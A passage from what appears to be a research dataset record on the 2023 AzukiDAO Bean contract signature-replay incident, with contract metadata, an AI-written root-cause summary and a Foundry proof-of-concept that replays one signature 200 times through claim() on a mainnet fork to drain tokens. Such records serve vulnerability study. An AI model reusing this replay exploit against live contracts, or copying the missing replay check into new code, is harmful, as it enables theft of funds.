ltiple times, draining approximately $69K worth of tokens from the contract.", "ai_mitigation": [], "ai_root_cause": "The `claim` function in the `Bean` contract failed to implement sufficient checks to prevent signature replay attacks. Specifically, it did not verify that the provided signature was unique for each claim or that it had not been used before. This allowed the same signature to be used multiple times to claim rewards, leading to the drain of funds.", "ai_vulnerability_type": "Signature Replay", "attack_title": "Tx : https://etherscan.io/tx/0x6233c9315dd3b6a6fcc7d653f4dca6c263e684a76b4ad3d93595e3b8e8714d34", "contracts": [{"abi_available": true, "address": "0x8189afbe7b0e81dae735ef027cd31371b3974feb", "artifact_dir": "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean", "bytecode_available": false, "chain": {"id": 1, "name": "Ethereum"}, "compiler_version": "v0.8.6+commit.11564f7e", "contract_name": "Bean", "explorer_url": "https://etherscan.io/address/0x8189afbe7b0e81dae735ef027cd31371b3974feb", "fetch_error": null, "is_verified": true, "proxy": {"admin_address": null, "implementation_address": null, "is_proxy": false, "proxy_type": null, "resolution_depth": 0, "resolved_at": "2026-04-10T06:42:02.823Z"}, "role": "vulnerable", "source_available": true, "source_files": ["data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/access/Ownable.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/security/Pausable.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/security/ReentrancyGuard.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/token/ERC20/ERC20.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/token/ERC20/extensions/IERC20Metadata.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/token/ERC20/IERC20.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/token/ERC721/IERC721.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/utils/Context.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/utils/Counters.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/utils/cryptography/ECDSA.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/utils/introspection/IERC165.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/utils/math/Math.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/utils/math/SafeMath.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/utils/math/SignedMath.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/@openzeppelin/contracts/utils/Strings.sol", "data/contracts/2023_07_azukidao/contracts/01_vulnerable_8189afbe_bean/sources/contracts/Bean.sol"], "source_hint": "AI extracted: The `claim` function in the `IBean` contract lacks proper validation for the provided signature. The same signature is used multiple times in a loop, allowing the attacker to claim rewards repeatedly without a valid, unique signature for each claim. This leads to an excessive amount of rewards being claimed.", "verification_status": "verified"}], "contracts_dir": "data/contracts/2023_07_azukidao", "id": "2023_07_azukidao", "metadata": {"ai_enabled": true, "ai_model": "gemini-2.5-flash-lite|gemini-2.5-flash-lite", "dataset_version": "1.0.0", "poc_parser_version": "1.0.0", "processed_at": "2026-04-10T06:42:06.111Z"}, "num_bytecode_contracts": 0, "num_contracts": 1, "num_source_contracts": 1, "num_verified_contracts": 1, "poc_code": "// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$69K
// Attacker : https://etherscan.io/address/0x85d231c204b82915c909a05847cca8557164c75e
// Vulnerable Contract : https://etherscan.io/address/0x8189afbe7b0e81dae735ef027cd31371b3974feb
// Attack Tx : https://etherscan.io/tx/0x6233c9315dd3b6a6fcc7d653f4dca6c263e684a76b4ad3d93595e3b8e8714d34

// @Analysis
// https://twitter.com/sharkteamorg/status/1676892088930271232

interface IBean is IERC20 {
    function claim(
        address[] memory _contracts,
        uint256[] memory _amounts,
        uint256[] memory _tokenIds,
        uint256 _claimAmount,
        uint256 _endTime,
        bytes memory _signature
    ) external;
}

contract AzukiTest is Test {
    IERC20 AZUKI = IERC20(0xED5AF388653567Af2F388E6224dC7C4b3241C544);
    IBean Bean = IBean(0x8189AFBE7b0e81daE735EF027cd31371b3974FeB);
    address private constant Elemental = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
    address private constant Beanz = 0x306b1ea3ecdf94aB739F1910bbda052Ed4A9f949;
    address private constant azukiDAOExploiter = 0x85D231C204B82915c909A05847CCa8557164c75e;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 17_593_308);
        cheats.label(address(AZUKI), "AZUKI");
        cheats.label(address(Bean), "Bean");
        cheats.label(Elemental, "Elemental");
        cheats.label(Beanz, "Beanz");
        cheats.label(azukiDAOExploiter, "Azuki DAO Exploiter");
    }

    function testExploit() public {
        deal(address(Bean), azukiDAOExploiter, 0);
        emit log_named_decimal_uint(
            "Attacker balance of Bean token before exploit", Bean.balanceOf(azukiDAOExploiter), Bean.decimals()
        );
        // Arguments for the claim() function calls
        // Signature: sender + contracts + tokenIds + claimAmount + endTime
        bytes32 r = 0xd044373fa377c3af4a854829176d14eebc23d96c342401b294f3491f0616559c;
        bytes32 s = 0x341d0ad6bccd30ed1d09d1b778a4f91738d5105f3986c7e6de9f9df847c90c93;
        uint8 v = 27;
        bytes memory signature = abi.encodePacked(r, s, v);
        assertEq(signature.length, 65);

        address[] memory contracts = new address[](3);
        contracts[0] = address(AZUKI);
        contracts[1] = Elemental;
        contracts[2] = Beanz;
        uint256[] memory amounts = new uint256[](3);
        amounts[0] = 1;
        amounts[1] = 0;
        amounts[2] = 0;
        uint256[] memory tokenIds = new uint256[](1);
        tokenIds[0] = 3748;
        vm.startPrank(azukiDAOExploiter);
        // Call claim() 200 times with the same signature. Invalid signature check in Bean token contract.
        // More iterations possible.
        for (uint256 i; i < 200; ++i) {
            Bean.claim(
                contracts,
                amounts,
                tokenIds,
                31_250 * 1e18,
                1_688_142_867, // endTime. This value must be specific to the 'endTime' provided in the attack tx. Block.timestamp won't work here.
                signature
            );
        }
        vm.stopPrank();

        emit log_named_decimal_uint(
            "Attacker balance of Bean token after exploit", Bean.balanceOf(azukiDAOExploiter), Bean.decimals()
        );
    }
}
